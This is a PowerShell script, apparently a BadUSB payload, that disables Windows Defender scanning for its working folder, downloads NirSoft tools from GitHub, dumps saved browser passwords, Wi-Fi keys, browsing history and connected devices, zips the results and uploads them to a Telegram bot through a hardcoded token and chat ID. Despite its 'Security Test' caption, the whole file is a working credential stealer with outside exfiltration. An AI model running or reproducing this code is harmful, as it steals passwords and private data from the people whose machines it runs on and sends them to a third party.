#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                        

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# Create directory
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Add-MpPreference -ExclusionPath $basePath -Force

# Download necessary tools
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe # Download the NirSoft tool for browser history
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe # Download the NirSoft tool for connected devices
# Execute tools to gather data
.\WebBrowserPassView.exe /stext passwords.txt
.\WirelessKeyView.exe /stext wifi.txt
.\WNetWatcher.exe /stext connected_devices.txt # Create the file for connected devices
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt # Create the file for browser history 
# Wait for the files to be fully written
while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt")) {
    Start-Sleep -Seconds 1
}

Move-Item passwords.txt, wifi.txt -Destination "$dumpFolder"

# Compress extracted data
Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

# Wait until the ZIP file is created
while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
    Start-Sleep -Seconds 1
}




# Telegram configuration
$token = "7303458194:AAGpVa4Afhhs9-Ktoc2R0vORdkv2IkmQ7qI"
$chatID = "-1002253101608"
$uri = "https://api.telegram.org/bot$token/sendDocument"
$caption = "Security Test - Attempted exfiltration from $env:USERNAME"

# Check if the file exists before sending
if (!(Test-Path $dumpFile)) {
    exit 1
}

# Ensure System.Net.Http is available
if (-not ("System.Net.Http.HttpClient" -as [type])) {
    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
    if ($httpPath) {
        Add-Type -Path $httpPath
    } else {
        exit 1
    }
}

# Create HTTP client
$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent
$content.Add((New-Object System.Net.Http.StringContent($chatID)), "chat_id")
$content.Add((New-Object System.Net.Http.StringContent($caption)), "caption")

# Attach the ZIP file
$filename = [System.IO.Path]::GetFileName("$dumpFile")
$fileStream = [System.IO.File]::OpenRead("$dumpFile")
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$content.Add($fileContent, "document", $filename)

# Send data to Telegram
try {
    $client.PostAsync($uri, $content).Wait()
} catch {}

exit
